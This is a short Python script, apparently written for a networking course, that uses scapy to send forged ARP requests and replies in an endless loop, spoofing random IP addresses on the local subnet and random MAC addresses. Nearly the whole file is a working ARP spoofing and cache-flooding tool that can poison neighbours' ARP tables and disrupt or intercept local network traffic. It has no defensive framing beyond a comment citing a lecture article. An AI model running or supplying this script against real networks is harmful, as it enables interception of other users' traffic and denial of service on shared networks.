__author__ = 'Yuxibro'

import logging
import socket
logging.getLogger("scapy").setLevel(1)
from scapy.all import *
from scapy.all import conf,sendp,srp1,ICMP,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP,get_if_raw_hwaddr,random,send,RandMAC

conf.checkIPaddr = False
#MAIN:
# After reading an article that's posted on course lecture note: http://www.arppoisoning.com/demonstrating-an-arp-poisoning-attack/
IPV4Address = socket.gethostbyname(socket.gethostname())
splittedIPv4 = IPV4Address.split(".")               # get current IPV4 and split it into array
print "Our IPV4 address: ",IPV4Address      #rejoin the string for printing


# takes an splitted IPv4 address array and assemble it back to standard IPv4 address with "."
def reassembleIPAddress(splittedIPArrary):
    resultString = ""
    for index in range(len(splittedIPArrary)):
        if index < len(splittedIPArrary)-1:
            resultString+=splittedIPArrary[index]+"."
        else:
            resultString+=splittedIPArrary[index]
    return resultString

while 1:
    global splittedIPv4

    # Randomize source IP&MAC address
    sourceIP = splittedIPv4
    sourceIP[3] = str(random.randint(1,255))
    sourceIP = reassembleIPAddress(sourceIP)
    sourceMAC = str(RandMAC())

    # Randomize destination IP&MAC address
    dstIP = splittedIPv4
    dstIP[3] = str(random.randint(1,255))
    dstIP = reassembleIPAddress(dstIP)
    dstMAC = str(RandMAC())

    op = 1 # Op code 1 for ARP requests
    arpRequest = ARP(op=op,psrc=sourceIP,hwsrc=sourceMAC,pdst=dstIP)
    arpRequest.show()
    send(arpRequest)                # send request out

    op = 2
    arpReply = ARP(op=op,psrc=arpRequest.pdst,hwsrc=dstMAC,pdst=arpRequest.psrc,hwdst=arpRequest.hwsrc)
    print "Reply !! : "
    arpReply.show()
    send(arpReply)                  # send out the reply
    time.sleep(3)


